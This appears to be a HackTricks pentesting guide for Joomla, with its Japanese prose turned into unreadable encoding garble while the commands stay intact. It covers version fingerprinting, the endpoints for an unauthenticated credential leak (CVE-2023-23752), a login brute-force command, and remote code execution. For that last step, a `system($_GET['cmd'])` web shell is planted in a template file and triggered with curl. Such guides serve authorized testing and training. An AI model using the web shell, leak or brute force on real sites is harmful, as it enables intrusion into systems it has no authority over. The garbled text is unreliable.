# Joomla

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Joomlaã®çµ±è¨ˆ

Joomlaã¯ã€Joomlaã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹Joomlaã€PHPã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„ã‚µãƒ¼ãƒãƒ¼ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®å†…è¨³ãªã©ã€ã„ãã¤ã‹ã®åŒ¿åã®[ä½¿ç”¨çµ±è¨ˆ](https://developer.joomla.org/about/stats.html)ã‚’åé›†ã—ã¾ã™ã€‚ã“ã®ãƒ‡ãƒ¼ã‚¿ã¯ã€å½¼ã‚‰ã®å…¬é–‹[API](https://developer.joomla.org/about/stats/api.html)ã‚’ä»‹ã—ã¦ã‚¯ã‚¨ãƒªã§ãã¾ã™ã€‚
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## Enumeration

### Discovery/Footprinting

* **ãƒ¡ã‚¿**ã‚’ç¢ºèªã™ã‚‹
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ãƒãƒ¼ã‚¸ãƒ§ãƒ³

* **/administrator/manifests/files/joomla.xml** ã§ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã§ãã¾ã™ã€‚
* **/language/en-GB/en-GB.xml** ã§Joomlaã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã§ãã¾ã™ã€‚
* **plugins/system/cache/cache.xml** ã§ãŠãŠã‚ˆãã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã§ãã¾ã™ã€‚

### è‡ªå‹•
```bash
droopescan scan joomla --url http://joomla-site.local/
```
In[ **80,443 - Pentesting Web Methodologyã¯CMSã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã«é–¢ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã™**](./#cms-scanners)ã§ã€Joomlaã‚’ã‚¹ã‚­ãƒ£ãƒ³ã§ãã¾ã™ã€‚

### API èªè¨¼ãªã—ã®æƒ…å ±æ¼æ´©:

ãƒãƒ¼ã‚¸ãƒ§ãƒ³4.0.0ã‹ã‚‰4.2.7ã¯ã€èªè¨¼ãªã—ã®æƒ…å ±æ¼æ´©ï¼ˆCVE-2023-23752ï¼‰ã«å¯¾ã—ã¦è„†å¼±ã§ã€ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚„ãã®ä»–ã®æƒ…å ±ã‚’ãƒ€ãƒ³ãƒ—ã—ã¾ã™ã€‚

* ãƒ¦ãƒ¼ã‚¶ãƒ¼: `http://<host>/api/v1/users?public=true`
* è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«: `http://<host>/api/index.php/v1/config/application?public=true`

**MSFãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«**: `scanner/http/joomla_api_improper_access_checks` ã¾ãŸã¯rubyã‚¹ã‚¯ãƒªãƒ—ãƒˆ: [51334](https://www.exploit-db.com/exploits/51334)

### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®[ã‚¹ã‚¯ãƒªãƒ—ãƒˆ](https://github.com/ajnik/joomla-bruteforce)ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ­ã‚°ã‚¤ãƒ³ã®ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

ã‚‚ã—**ç®¡ç†è€…ã®è³‡æ ¼æƒ…å ±**ã‚’å–å¾—ã§ããŸã‚‰ã€**PHPã‚³ãƒ¼ãƒ‰ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆ**ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§**RCEã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚ã“ã‚Œã‚’**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º**ã™ã‚‹ã“ã¨ã§è¡Œã„ã¾ã™ã€‚

1. `Configuration`ã®ä¸‹ã«ã‚ã‚‹**`Templates`**ã‚’**ã‚¯ãƒªãƒƒã‚¯**ã—ã¦ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ¡ãƒ‹ãƒ¥ãƒ¼ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚
2. **ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**åã‚’**ã‚¯ãƒªãƒƒã‚¯**ã—ã¾ã™ã€‚`Template`åˆ—ã®ä¸‹ã«ã‚ã‚‹**`protostar`**ã‚’é¸æŠã—ã¾ã—ã‚‡ã†ã€‚ã“ã‚Œã§**`Templates: Customise`**ãƒšãƒ¼ã‚¸ã«ç§»å‹•ã—ã¾ã™ã€‚
3. æœ€å¾Œã«ã€ãƒšãƒ¼ã‚¸ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦**ãƒšãƒ¼ã‚¸ã‚½ãƒ¼ã‚¹**ã‚’è¡¨ç¤ºã§ãã¾ã™ã€‚**`error.php`**ãƒšãƒ¼ã‚¸ã‚’é¸ã³ã¾ã—ã‚‡ã†ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«**ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’å¾—ã‚‹ãŸã‚ã®PHPãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼**ã‚’è¿½åŠ ã—ã¾ã™ï¼š
1. **`system($_GET['cmd']);`**
4. **ä¿å­˜ã—ã¦é–‰ã˜ã‚‹**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`

## From XSS to RCE

* [**JoomSploit**](https://github.com/nowak0x01/JoomSploit): Joomlaã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã€**XSSã‚’RCEã¾ãŸã¯ãã®ä»–ã®é‡å¤§ãªè„†å¼±æ€§ã«æ˜‡æ ¼**ã•ã›ã¾ã™ã€‚è©³ç´°ã¯[**ã“ã®æŠ•ç¨¿**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚**Joomlaãƒãƒ¼ã‚¸ãƒ§ãƒ³5.X.Xã€4.X.Xã€3.X.Xã‚’ã‚µãƒãƒ¼ãƒˆã—ã€ä»¥ä¸‹ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š**
* _**ç‰¹æ¨©æ˜‡æ ¼ï¼š**_ Joomlaã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¾ã™ã€‚
* _**(RCE) ãƒ“ãƒ«ãƒˆã‚¤ãƒ³ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ç·¨é›†ï¼š**_ Joomlaã®ãƒ“ãƒ«ãƒˆã‚¤ãƒ³ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ç·¨é›†ã—ã¾ã™ã€‚
* _**(ã‚«ã‚¹ã‚¿ãƒ ) ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼š**_ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã®Joomlaãƒ—ãƒ©ã‚°ã‚¤ãƒ³ç”¨ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
